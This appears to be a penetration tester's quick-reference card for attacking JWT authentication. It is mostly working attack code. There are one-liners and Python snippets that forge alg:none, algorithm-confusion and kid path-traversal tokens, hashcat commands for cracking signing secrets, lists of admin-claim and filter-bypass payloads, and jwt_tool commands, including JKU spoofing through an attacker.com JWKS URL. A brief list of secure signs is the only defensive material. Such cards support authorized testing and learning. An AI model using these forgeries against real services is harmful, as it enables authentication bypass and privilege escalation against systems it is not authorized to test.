# JWT — Quick Start

Quick-reference card. Per-technique scenarios in `scenarios/jwt/`. See `authentication-principles.md` for decision tree.

## 30-second smoke test

```bash
# 1. Decode token
echo "<token>" | cut -d. -f2 | base64 -d 2>/dev/null | jq

# 2. Try alg:none
python3 -c "import base64,json; h=base64.urlsafe_b64encode(json.dumps({'alg':'none','typ':'JWT'}).encode()).decode().rstrip('='); p=base64.urlsafe_b64encode(json.dumps({'sub':'admin'}).encode()).decode().rstrip('='); print(f'{h}.{p}.')"

# 3. Crack weak secret
hashcat -m 16500 jwt.txt jwt.secrets.list

# 4. Algorithm confusion (RS256→HS256)
curl /.well-known/jwks.json
# → derive PEM, sign HS256 with PEM as secret
```

## Decision tree

```
Decode the token. Look at "alg":
├── "none"            → scenarios/jwt/none-algorithm.md
├── "HS256/384/512"   → scenarios/jwt/weak-secret-crack.md
├── "RS256/384/512"   → scenarios/jwt/alg-confusion.md (with public JWKS)
│                     → scenarios/jwt/jwk-injection.md (if jwk header trusted)
│                     → scenarios/jwt/jku-injection.md (if jku header trusted)
└── "ES256/384/512"   → scenarios/jwt/psychic-signatures-cve-2022-21449.md

Look for header parameters:
├── kid               → scenarios/jwt/kid-path-traversal.md
├── x5u / x5c         → scenarios/jwt/x5u-x5c-injection.md
└── jku / jwk         → see above

Token has 5 parts (JWE)?
└── scenarios/jwt/jwe-nested-token.md

Have working forgery?
└── scenarios/jwt/claim-tampering.md (modify sub/role/exp/tenant)
```

## One-liner exploits

### alg:none

```bash
H=$(echo -n '{"alg":"none","typ":"JWT"}' | base64 -w0 | tr '+/' '-_' | tr -d '=')
P=$(echo -n '{"sub":"admin","exp":9999999999}' | base64 -w0 | tr '+/' '-_' | tr -d '=')
echo "$H.$P."
```

### Crack HS256

```bash
hashcat -m 16500 jwt.txt jwt.secrets.list
hashcat -m 16500 jwt.txt rockyou.txt -r rules/best64.rule
```

### Algorithm confusion

```python
from jwcrypto import jwk
import jwt, requests
jwks = requests.get('https://target/.well-known/jwks.json').json()
key = jwk.JWK(**jwks['keys'][0])
pem = key.export_to_pem()
forged = jwt.encode({"sub":"admin"}, pem, algorithm='HS256',
                     headers={"alg":"HS256","typ":"JWT"})
```

### kid path traversal

```python
import jwt, base64
forged = jwt.encode({"sub":"admin"},
                     base64.b64decode('AA=='),    # null byte
                     algorithm='HS256',
                     headers={"alg":"HS256","kid":"../../../../../../../dev/null"})
```

### Signature stripping

```bash
TOKEN="<original>"
HEADER=$(echo $TOKEN | cut -d. -f1)
NEW_PAYLOAD=$(echo -n '{"sub":"admin"}' | base64 -w0 | tr '+/' '-_' | tr -d '=')
echo "$HEADER.$NEW_PAYLOAD."
```

## Common payloads

### Identity claims

```json
{"sub":"admin","user_id":1,"username":"administrator","email":"admin@..."}
```

### Authorization claims

```json
{"role":"admin","roles":["admin"],"is_admin":true,"isAdmin":true,
 "permissions":["*"],"scope":"admin:all"}
```

### Temporal claims

```json
{"exp":9999999999,"iat":0,"nbf":0}
```

### kid path traversal targets

```
../../../../../../../dev/null                       (sign with null byte)
../../../../../../../etc/hostname                   (sign with hostname)
../../../../../../../proc/sys/kernel/hostname
../../../../../../app/config/public.key
```

### alg filter-bypass variations

```json
{"alg":"None"}    {"alg":"NONE"}     {"alg":"nOnE"}
{"alg":" none"}   {"alg":"none "}    {"alg":null}
{"alg":""}        {"alg":["none"]}   {"alg":{"value":"none"}}
```

## jwt_tool reference

```bash
python3 jwt_tool.py JWT                                       # decode + display
python3 jwt_tool.py JWT -M at -t "https://target/api"         # all attacks against URL
python3 jwt_tool.py JWT -X a                                   # none algorithm
python3 jwt_tool.py JWT -X i                                   # embedded JWK
python3 jwt_tool.py JWT -X s -ju https://attacker.com/jwks.json # JKU spoofing
python3 jwt_tool.py JWT -I -hc kid -hv "../../dev/null"        # kid injection
python3 jwt_tool.py JWT -X k -pk public.pem                    # algorithm confusion
python3 jwt_tool.py JWT -C -d wordlist.txt                     # crack secret
python3 jwt_tool.py JWT -T -S hs256 -p "found_secret"          # forge with secret
```

## Hashcat modes

| Mode | Algorithm |
|---|---|
| 16500 | JWT (HS256) |
| 16511 | JWT (HS384) |
| 16512 | JWT (HS512) |

## Burp JWT Editor workflow

1. Repeater → JSON Web Token tab.
2. Modify header / payload.
3. Sign options:
   - **none** — set alg=none, drop signature, trailing dot.
   - **HS\*** — Keys tab → New Symmetric Key → `k = base64(secret)`.
   - **RS\*** — Keys tab → New RSA Key → Sign.
   - **Embedded JWK** — Attack → Embedded JWK → select key.
4. Send.

## Vulnerable signs

- `alg:none` or modified `alg` accepted.
- Empty/null secret accepted.
- Public key at `/.well-known/jwks.json` AND token uses RS256 → algorithm confusion possible.
- `kid` reflects user input (path / SQL / shell).
- `jku` URL honored from token header.
- Signature missing or trailing dot accepted.

## Secure signs

- Library uses explicit `algorithms=["RS256"]` allowlist.
- `verify=True` mandatory.
- JWKS endpoint pinned in config (not from token header).
- `exp`, `nbf`, `iat`, `iss`, `aud` all validated.
- Rotating signing keys with kid + JWKS lookup.

## Time-saving tips & gotchas

1. Always check `/.well-known/openid-configuration` first.
2. Run `jwt_tool -M at` for full automated scan.
3. Check JS bundles for hardcoded secrets: `curl /static/js/main.*.js | grep -iE 'secret|sign|HS256'`.
4. Check git history: `git log -p | grep -iE 'jwt_secret|signing_key'`.
5. .NET claim short-name for `ClaimTypes.Name` is `unique_name`.
6. Trailing dot mandatory on alg:none tokens.
7. Base64URL: replace `+`→`-`, `/`→`_`, strip `=`.
8. `decode()` ≠ `verify()` — `decode(verify=False)` is the bug.
9. `kid` must match JWKS kid for kid-based lookup.

## Resources

- `INDEX.md`, `scenarios/jwt/`, `jwt_security_resources.md`.
- jwt.io, jwt_tool: https://github.com/ticarpi/jwt_tool
